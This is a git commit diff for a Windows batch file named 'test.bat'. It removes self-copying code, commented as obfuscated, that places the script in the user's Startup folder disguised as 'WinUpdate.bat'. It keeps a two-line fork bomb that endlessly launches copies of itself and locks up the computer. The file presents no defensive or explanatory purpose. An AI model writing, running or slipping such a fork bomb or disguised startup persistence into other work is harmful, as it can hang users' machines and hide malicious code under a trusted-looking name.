5d61dd40b5a114a2291c88c59782a298a80aca12
DJDSTr01 <boudyactivities@gmail.com>
2025-04-04 14:44:21 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,15 +1,3 @@
 @echo off
-setlocal enabledelayedexpansion
-
-:: Obfuscated Startup path retrieval
-for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "s=%%a"
-
-:: Create hidden file name
-set "h=WinUpdate.bat"
-
-:: Copy itself to Startup
-copy "%~f0" "!s!\!h!" >nul
-
-:: Obfuscate the infinite loop
 set "x=%0"
 %x%|%x%
